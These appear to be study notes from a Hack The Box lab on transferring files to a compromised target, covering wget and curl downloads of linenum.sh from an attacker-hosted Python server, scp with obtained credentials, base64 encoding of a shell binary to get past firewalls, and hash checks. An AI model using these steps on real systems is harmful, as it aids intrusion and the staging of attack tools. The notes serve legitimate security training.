### wget
- We can use multiple methods to download files from our host to the target using wget.
- One is running a [Python HTTP server](https://developer.mozilla.org/en-US/docs/Learn/Common_questions/set_up_a_local_testing_server) from the host and having the target download the files from there.
- An example of doing that is shown below:
```shell-session
secmancer@htb[/htb]$ cd /tmp
secmancer@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
- Now with it setup, we can easily download the file on the target:
```shell-session
user@remotehost$ wget http://10.10.14.1:8000/linenum.sh

...SNIP...
Saving to: 'linenum.sh'

linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s

2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
```
- If wget isn't available on the target, we can also use cURL to download the file as well:
```shell-session
user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

100  144k  100  144k    0     0  176k      0 --:--:-- --:--:-- --:--:-- 176k
```
- Note: the `-o` flag specifies the output file name.



### SCP
- We can also use scp using obtained ssh user credentials from the target.
```shell-session
secmancer@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh

user@remotehost's password: *********
linenum.sh
```
- We specified the local file name after `scp`.
- So, the remote directory will be saved to after the `:`.


### Base64
- We may not be able to transfer the file so easily, like if the target has firewall protections in place.
- If this happens, we can use the trick of encoding the file with [base64](https://linux.die.net/man/1/base64) and then decoding the string on the target computer.
```shell-session
secmancer@htb[/htb]$ base64 shell -w 0

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
```
- With this string, we can put it onto the target and use `base64 -d` to decode it and pipe it into a file.
```shell-session
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
```


### Validating File Transfers
- We can use the [file](https://linux.die.net/man/1/file) command to validate the file's format.
```shell-session
user@remotehost$ file shell
shell: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
```
- As we can see, it is an ELF binary, meaning the transfer was successful!
- To further ensure we didn't mess it up during the encoding/decoding process, we can check the md5 hash associated with it.
```shell-session
secmancer@htb[/htb]$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
- Now, we can run the same command on the file we have transferred:
```
user@remotehost$ md5sum shell

321de1d7e7c3735838890a72c9ae7d1d shell
```
- Since both hashes match, it was transferred correctly.